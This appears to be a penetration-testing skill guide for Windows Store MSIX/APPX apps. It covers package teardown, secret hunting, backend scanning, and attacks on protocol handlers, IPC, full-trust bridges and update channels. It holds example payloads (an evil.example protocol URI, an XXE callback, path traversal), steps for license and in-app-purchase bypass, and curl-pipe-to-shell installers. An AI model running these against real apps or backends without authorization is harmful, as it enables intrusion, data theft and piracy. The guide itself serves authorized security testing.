---
name: windows_store_app
description: MSIX/APPX Windows Store app assessment covering package teardown, protocol/IPC abuse, secret recovery, and update-channel attacks
---

# Windows Microsoft Store App (MSIX/APPX)

A Microsoft Store identifier resolves to a packaged Windows application shipped as MSIX/APPX (or the .msixbundle/.appxbundle multi-arch container). The package is a signed ZIP carrying the app payload, an `AppxManifest.xml`, an `AppxBlockMap.xml`, and a `AppxSignature.p7x`. The attacker objective is to acquire the package off the Store, unpack it, and assess the binaries, manifest-declared entry points (protocol handlers, file associations, app services, full-trust launchers), embedded secrets, and the network/update backends it talks to — turning a client-side install into auth bypass, local privilege escalation, RCE, or backend compromise. Treat the MSIX as a redistributable artifact you fully control: everything inside ships to every user, so anything sensitive there is already disclosed.

## Attack Surface

**Package container**
- `AppxManifest.xml` — declared `Capability`/`DeviceCapability`, `Extensions` (protocol handlers, file type associations, `windows.appService`, `desktop:FullTrustProcess`, `startupTask`, COM servers, `appExecutionAlias`), `Identity` (publisher, version), `TargetDeviceFamily`
- Payload binaries — managed (.NET / C#, UWP), native (C++/WinRT), or packaged Win32/Electron/React-Native-Windows
- `AppxBlockMap.xml` + `AppxSignature.p7x` — integrity and signing chain
- Bundled assets, config JSON/XML, `.pri` resource indexes, sqlite DBs, ML models, embedded web content (WebView2/WinUI)

**Runtime entry points (attacker-reachable from another low-priv app or the web)**
- Custom URI protocol activation (`myapp://...`) reachable from a browser/HTML
- App Services (`windows.appService`) callable cross-process by other packages
- File Type Associations — opening a crafted file triggers the app's parser
- Full-trust companion process / `runFullTrust` capability bridging UWP sandbox to Win32
- `appExecutionAlias` (a PATH-resolvable exe stub), COM/OLE servers, share/contact targets

**Network & platform backends**
- REST/GraphQL/gRPC APIs the app authenticates to (often with bearer tokens or API keys)
- OAuth/MSAL/AAD flows, license/entitlement and IAP validation endpoints
- Auto-update / delta-download channels and CDN package mirrors
- Local IPC: named pipes, loopback HTTP servers, WebView2 message bridges, `localStorage`/IndexedDB

**Local data at rest**
- `%LOCALAPPDATA%\Packages\<PackageFamilyName>\LocalState`, `Settings\settings.dat` (registry hive), `RoamingState`, `LocalCache`
- DPAPI/Credential Locker (`PasswordVault`) blobs, cached tokens, sqlite caches

## Recon & Enumeration

Acquire the package first, then statically and dynamically assess it.

**Acquire the MSIX/APPX**
- From a Windows box with the app installed: `Get-AppxPackage *vendor* | Select InstallLocation` then copy the folder, or `Add-AppxPackage` history.
- Re-package an installed app's payload: `makeappx pack /d "<InstallLocation>" /p out.msix` (Windows SDK).
- From the Store without installing: resolve the ProductId and pull the download URL via the public delivery endpoint `https://store.rg-adguard.net` (paste the Store URL / ProductId) or `winget download --id <Publisher.App> --download-directory ./pkg` (winget 1.6+ supports offline download). Save the `.msix`/`.msixbundle`.
- Side-load source for inspection only; never distribute.

**Unpack (works cross-platform — MSIX is a ZIP)**
```
unzip -o app.msix -d app_unpacked            # bundles: unzip the .msixbundle first, then inner .msix
makeappx unpack /p app.msix /d app_unpacked  # on Windows, preserves footprint
xmllint --format app_unpacked/AppxManifest.xml | less
```

**Triage binaries**
- .NET / UWP managed: decompile with ILSpy / `ilspycmd -o decomp app_unpacked/App.dll` or dnSpy; install: `dotnet tool install -g ilspycmd`.
- Native PE: `binwalk app_unpacked/*.exe`; strings/imports via `rabin2 -zI file.exe` (radare2) or Ghidra (`apt install -y ghidra` / snap). Install binwalk: `pipx install binwalk` or `apt install -y binwalk`.
- Electron/React-Native: extract `app.asar` with `npx @electron/asar extract app.asar src/` then read JS; check `webContents`/`nodeIntegration`.
- SBOM + known-vuln deps: `syft dir:app_unpacked -o cyclonedx-json > sbom.json` then `grype sbom:sbom.json`. Install: `curl -sSfL get.anchore.io/syft | sh` and `.../grype | sh`. Also `trivy fs app_unpacked`.

**Hunt secrets**
- `trufflehog filesystem app_unpacked --only-verified` and `gitleaks dir app_unpacked -v`.
- `grep -rIEn '(api[_-]?key|secret|client_secret|password|bearer|AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z_-]{35})' app_unpacked`.
- Decode any embedded JWTs/tokens: `jwt_tool <token>` to read claims and check `alg`/exp.

**Map manifest entry points & backends**
- Pull every `<Extension>`, `<uap:Protocol>`, `<uap:FileTypeAssociation>`, `desktop:FullTrustProcess`, `windows.appService`, `appExecutionAlias` from `AppxManifest.xml`.
- Enumerate endpoints the binaries call: `grep -rIoE 'https?://[a-zA-Z0-9./_-]+' app_unpacked | sort -u`, then resolve and scan hosts:
```
echo api.vendor.example | dnsx -a -resp | tee hosts.txt
subfinder -d vendor.example -silent | httpx -silent -title -tech-detect -o live.txt
naabu -host api.vendor.example -top-ports 1000 -silent
nuclei -l live.txt -as -s critical,high -rl 50 -c 20 -bs 20 -timeout 10 -retries 1 -j -o nuclei.jsonl
```
- Source-grep static analysis on decompiled/JS sources: `semgrep --config p/security-audit --config p/secrets decomp/`.

**Dynamic (Windows VM)**
- Process Monitor + Process Explorer to watch file/registry/named-pipe/network activity at launch.
- mitmproxy/Burp with the cert trusted in the user store; note UWP loopback isolation (`CheckNetIsolation LoopbackExempt -a -n=<PackageFamilyName>` to allow proxying loopback during authorized testing).
- For .NET, attach dnSpy at runtime; for native, x64dbg/Frida (`pip install frida-tools`; `frida-trace`).

## Methodology

1. Acquire the exact shipping package (`.msix`/`.msixbundle`) and record `Identity` name, publisher, version from the manifest.
2. Verify the signing chain: confirm `AppxSignature.p7x` validates and the publisher CN matches `Identity@Publisher`; note self-signed vs CA-issued. A mismatch enables repackaging/spoofing.
3. Unpack and inventory: list all binaries, config files, embedded web content, DBs, and the full set of manifest `Extensions`/`Capabilities`.
4. Static-assess each entry point in priority order: protocol handlers → file associations → app services → full-trust bridge → COM/aliases. For each, find the handler in code and trace how attacker-controlled input flows.
5. Recover secrets and credentials from the payload and config; classify each (live API key, signing key, OAuth client secret, hardcoded creds).
6. Build the backend map from hardcoded URLs; recon and scan those hosts/APIs with the acquired tokens (authorized scope only).
7. Stand up the Windows VM, install, and observe runtime: intercept TLS, dump named pipes/loopback servers, read `settings.dat` and LocalState after exercising features.
8. Validate the highest-impact candidates with a PoC (crafted protocol URL, malicious associated file, API call with extracted key, update tamper).
9. Assess local data protection (DPAPI usage, token storage) and update-channel integrity.
10. Document client-side-trust assumptions broken and chain client findings into backend impact.

## Key Weaknesses / Techniques

**Hardcoded secrets / over-privileged keys**
- Shipping live API keys, cloud creds, or OAuth client secrets in the payload. Extract, then exercise scope:
  `curl -s https://api.vendor.example/v1/me -H "Authorization: Bearer <token_from_package>"`. Check whether the key is account-scoped vs admin/service-scoped.

**Insecure custom protocol handler**
- Handler passes the activation URI into a command, file path, deep-link router, or WebView without validation. From a web page or another app:
  `start "" "myapp://open?file=\\attacker\share\x"` or `myapp://action?url=https://evil.example/payload`.
- Test path traversal (`myapp://load?path=..\..\..\Windows\System32\...`), argument injection into a spawned full-trust process, and SSRF/open-redirect when the URI feeds an outbound fetch. Confirm exfil with `interactsh-client` (embed the `*.oast.fun` host in the URI and watch for the callback).

**File Type Association parser bugs**
- Opening a crafted associated file reaches a native/managed parser. Fuzz the format and check for memory corruption (native) or deserialization/XXE (managed). For XML-backed formats, test classic XXE:
  `<!DOCTYPE x [<!ENTITY e SYSTEM "http://<interactsh-host>/x">]> <root>&e;</root>`.

**App Service / IPC trusting the caller**
- `windows.appService` and named pipes reachable by any local package. Enumerate the pipe, then send unauthorized commands; look for privileged actions exposed without caller identity checks (`GetCallerPackageFamilyName` absent). A loopback HTTP control server with no auth is the same bug class — `curl http://127.0.0.1:<port>/admin`.

**Full-trust bridge / LPE**
- UWP app launching a `desktop:FullTrustProcess` or `runFullTrust` companion. If the UWP side passes unsanitized input (a file path, URL, or command fragment) to the full-trust process, a low-priv attacker who can drive the UWP surface escalates outside the sandbox. Trace the `FullTrustProcessLauncher.LaunchFullTrustProcessForCurrentAppAsync` arguments.

**Insecure update channel**
- Updates fetched over HTTP, or HTTPS without signature/hash pinning beyond TLS. Test downgrade and substitution: MITM the update manifest, serve a tampered package, confirm the app installs/executes it. MSIX install requires a valid signature, but companion full-trust auto-updaters often skip this.

**WebView2 / Electron RCE surface**
- `nodeIntegration: true`, missing `contextIsolation`, or `AddHostObjectToScript`/`postMessage` bridges that expose native functions to loaded web content. If any attacker-influenced URL or content renders, XSS becomes native code execution. Check CSP and the `WebMessageReceived` handlers.

**Weak local data protection**
- Tokens/secrets written to `LocalState`/`settings.dat` in plaintext or with reversible encoding instead of DPAPI/`PasswordVault`. Read them post-login and confirm they are usable from another machine (true secret leak) vs DPAPI-bound (machine/user-tied).

**Client-side license / entitlement / IAP bypass**
- Premium gating or IAP validated only in-client. Patch the check (dnSpy IL edit), or replay/forge the license response, to confirm server does not re-verify.

## Validation

- Build a minimal, reproducible PoC and capture before/after evidence.
- Protocol/FTA bugs: a saved `.html` with the `myapp://` link (or the crafted file) that, on a clean install, demonstrably executes the unintended action — screenshot/Process Monitor trace showing the spawned process, file read, or callback.
- Hardcoded-key/backend bugs: an authenticated API request using only artifacts extracted from the package, returning data the unauthenticated/lower-priv user should not see. Redact secret values in the report; prove scope, not just existence.
- IPC/full-trust bugs: a standalone low-priv client (or second package) issuing the privileged action and the high-priv side performing it; capture the `whoami`/integrity-level delta for LPE.
- Update bugs: a captured request/response showing the tampered package being accepted, executed in a VM snapshot.
- Always note: package version, file paths inside the package, exact handler/function name, and the trust boundary crossed.

## False Positives

- Strings that look like keys but are placeholders, test/sandbox creds, or public client IDs (public OAuth client IDs are not secrets by design — confirm a matching secret or that the flow is confidential).
- DPAPI/`PasswordVault`-protected blobs flagged as "plaintext secrets": they are bound to the user/machine and not portable — verify they cannot be used off-box before reporting.
- Protocol handlers that validate/canonicalize input or only operate within the package container — no boundary crossed.
- App Services that enforce caller package-family allowlists — IPC reachable but authorized.
- "HTTP" URLs that are localhost loopback only, or upgraded to HTTPS at runtime.
- Secret scanners firing on third-party SDK sample keys, source maps, or vendored test fixtures.
- License checks that are also enforced server-side (client patch yields a server 403) — not a bypass.
- Self-signed signature on a sideload/dev build that ships CA-signed in the Store.

## Chaining & Impact

- Hardcoded service key → backend API takeover → other users' data → full account/tenant compromise.
- Protocol handler injection (from a web page) → argument injection into full-trust companion → RCE / LPE on every install.
- File association parser bug → memory corruption → code execution by sending a victim one document.
- App Service / named-pipe trust flaw → low-priv local app drives privileged action → sandbox escape and LPE.
- WebView2 XSS + exposed host object → native code execution within the app's privileges.
- Insecure update channel → MITM serves tampered companion binary → mass RCE across the user base (supply-chain-style).
- Portable plaintext token in LocalState → reuse on attacker machine → account takeover without the victim's device.

## Pro Tips

- MSIX is just a signed ZIP — `unzip` it anywhere; you do not need Windows to read the manifest, decompile .NET, or pull `app.asar`. Reserve the VM for dynamic confirmation.
- The manifest is the map: every `Extension` is a remotely- or locally-reachable entry point. Enumerate them before touching binaries so you assess attacker-reachable code first.
- `.msixbundle`/`.appxbundle` are containers of per-arch `.msix` — unzip the outer bundle, pick the `x64` inner package, then unzip that.
- Anything in the package ships to everyone: a "hidden" admin key or debug endpoint in the payload is already public. Prioritize secret hunting early.
- `settings.dat` is a registry hive — load it with a hive parser (or `reg load` on Windows) rather than grepping the binary.
- UWP loopback isolation blocks proxying by default; the temporary `LoopbackExempt` registration is essential to intercept the app's own localhost traffic during authorized testing — revert it after.
- Full-trust companion processes are the usual sandbox-escape pivot; always check whether the UWP front-end can influence their command line or working file.
- Decompiled .NET names map cleanly to manifest handlers — search the decompiled tree for the protocol scheme string and the `OnActivated`/`Run` (IBackgroundTask) overrides to land on the handler fast.
- Re-pack and self-sign your modified build only in your own VM to validate client-side bypasses; never distribute a resigned package.
